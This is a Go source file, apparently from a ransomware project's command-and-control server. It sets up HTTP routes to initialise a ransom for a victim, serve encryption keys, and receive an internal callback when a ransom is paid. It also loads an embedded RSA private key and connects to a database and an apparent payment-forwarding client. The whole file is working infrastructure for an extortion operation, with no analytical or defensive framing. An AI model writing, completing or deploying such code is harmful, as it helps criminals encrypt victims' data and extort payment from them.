package server

import (
	"context"
	"encoding/json"
	"log"
	"net/http"
	"time"

	"github.com/Aran404/Forwarder/api/server"
	"github.com/Aran404/Ransomware/c2/crypt"
	"github.com/Aran404/Ransomware/c2/database"
	"github.com/Aran404/Ransomware/c2/types"
	"github.com/go-chi/chi/middleware"
	"github.com/go-chi/chi/v5"
	"github.com/go-chi/httprate"
)

func handleError(w http.ResponseWriter, r *http.Request, status int, reason error) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)

	errorResponse := types.ErrorResponse{
		Success: false,
		Status:  status,
		Message: types.GetProperError(reason),
	}

	if err := json.NewEncoder(w).Encode(errorResponse); err != nil {
		log.Printf("Error encoding response: %v", err)
	}
}

func (c *Client) Listen() {
	c.http.Post(RansomPaidEndpoint+"/{id}", c.PaidCallback) // Not exposed, used internally only
	c.http.Post("/ransom/init", c.InitalizeRansom)
	c.http.Get("/ransom/key", c.GetEncryptionKey)
	if err := http.ListenAndServe(":9090", c.http); err != nil {
		log.Fatal(err)
	}
}

func NewClient(ctx context.Context) *Client {
	r := chi.NewRouter()
	r.Use(
		middleware.RequestID,
		middleware.RealIP,
		middleware.Logger,
		middleware.Recoverer,
		httprate.LimitByRealIP(100, time.Minute),
	)

	keys, err := crypt.FromPEM([]byte(RSAPrivateKey))
	if err != nil {
		log.Fatal(err)
	}

	return &Client{
		rsa:  keys,
		http: r,
		sol:  server.NewClient(ctx),
		db:   database.NewConn(ctx),
	}
}

func (c *Client) Close(ctx context.Context) {
	c.db.Close(ctx)
	c.http = nil
}
